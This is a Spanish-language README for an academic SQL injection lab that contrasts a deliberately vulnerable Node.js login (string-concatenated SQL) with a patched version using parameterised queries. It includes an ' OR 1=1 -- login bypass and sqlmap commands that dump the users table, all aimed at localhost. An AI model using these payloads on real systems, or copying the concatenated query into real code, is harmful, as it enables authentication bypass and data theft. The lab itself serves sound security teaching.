# KMATA – SQL Injection Lab

## 1. Descripción General

Este laboratorio académico demuestra:

1. Desarrollo de una aplicación web vulnerable a SQL Injection.
2. Desarrollo de una versión 2.0 segura mediante consultas parametrizadas.
3. Contenerización utilizando Docker Compose.
4. Explotación de la versión vulnerable con sqlmap.
5. Validación técnica de la mitigación implementada.

Ambas aplicaciones utilizan:

* Node.js / Express
* Microsoft SQL Server
* Docker y Docker Compose

---

# PARTE I — Aplicación Vulnerable

## 2. Arquitectura

Usuario → Aplicación Web → SQL Server

La versión vulnerable construye consultas SQL concatenando directamente los parámetros enviados por el usuario.

Ejemplo conceptual inseguro:


const query = "SELECT * FROM users WHERE username = '" + username +
"' AND password = '" + password + "'";


Esta práctica permite la inyección de código SQL.

---

## 3. Inicialización de la Base de Datos

El archivo `init.sql` contiene:

* Creación de la base de datos `kmata_lab_db`
* Creación de login `kmata`
* Creación de usuario
* Asignación de permisos
* Creación de la tabla `users`
* Inserción de datos de prueba

Usuarios disponibles:

| username | password  |
|----------|-----------|
| admin    | admin123  |
| user1    | 1234      |
| paola    | password  |

Para reinicializar completamente la base:


docker compose down -v


El parámetro `-v` elimina los volúmenes y fuerza la recreación de la base de datos.

---

## 4. Cómo levantar el laboratorio

Desde la raíz del proyecto:


docker compose up --build


Esto realiza:

1. Levantamiento de SQL Server.
2. Ejecución automática del script `init.sql`.
3. Inicio de la aplicación vulnerable.
4. Inicio de la aplicación segura.

La aplicación vulnerable queda disponible en:


http://localhost:3000


La aplicación segura queda disponible en:


http://localhost:4000


---

## 5. Pruebas Manuales — Versión Vulnerable

### Login válido


http://localhost:3000/auth/login


Credenciales:


username=admin
password=admin123


Resultado esperado: acceso exitoso.

### SQL Injection manual

Ingresar como username:


' OR 1=1 --


Password: cualquier valor.

Resultado esperado: bypass del login.

---

## 6. Explotación con sqlmap — Versión Vulnerable

Ejemplo:


python sqlmap.py -u "http://localhost:3000/auth/login
"
--data="username=admin&password=123"
--method=POST -p username --dump --batch


Posibles comandos adicionales:

Obtener bases de datos:


sqlmap -u "URL_OBJETIVO" --dbs


Obtener tablas:


sqlmap -u "URL_OBJETIVO" -D kmata_lab_db --tables


Dump completo:


sqlmap -u "URL_OBJETIVO" --dump


Resultado esperado: extracción completa de la tabla `users`.

---

# PARTE II — Versión 2.0 Aplicación Segura

## 7. Mejoras Implementadas

La versión segura corrige la vulnerabilidad mediante:

1. Uso de consultas parametrizadas.
2. Separación entre datos y código SQL.
3. Tipado explícito de parámetros.
4. Validación de entrada.

Ejemplo conceptual seguro:


request.input('username', sql.VarChar(50), username)
request.input('password', sql.VarChar(50), password)

SELECT * FROM users WHERE username = @username AND password = @password


---

## 8. Pruebas — Versión Segura

### Login válido


http://localhost:4000/auth/login


Credenciales:


username=admin
password=admin123


Resultado esperado: acceso exitoso.

### Intento de SQL Injection


username=' OR 1=1 --
password=anything


Resultado esperado:

* El login falla.
* No se produce bypass.
* sqlmap no detecta parámetros inyectables.

---

## 9. Prueba con sqlmap — Versión Segura


python sqlmap.py -u "http://localhost:4000/auth/login
"
--data="username=admin&password=123"
--method=POST -p username --dump --batch


Resultado esperado:


[CRITICAL] all tested parameters do not appear to be injectable


---

# 10. Comparación Técnica

| Característica        | Vulnerable            | Versión 2.0   |
|----------------------|-----------------------|---------------|
| Construcción SQL     | Concatenación directa | Parametrizada |
| Validación de entrada| No                    | Sí            |
| Vulnerable a SQLi    | Sí                    | No            |
| Explotable con sqlmap| Sí                    | No            |

---

# 11. Conclusiones

Este laboratorio demuestra:

* Cómo una mala práctica en la construcción de consultas SQL compromete completamente una base de datos.
* Cómo herramientas automatizadas pueden explotar vulnerabilidades reales con facilidad.
* Cómo la parametrización elimina una vulnerabilidad crítica.
* Cómo Docker permite reproducibilidad del entorno.

La comparación entre ambas versiones evidencia el impacto directo de aplicar buenas prácticas de desarrollo seguro.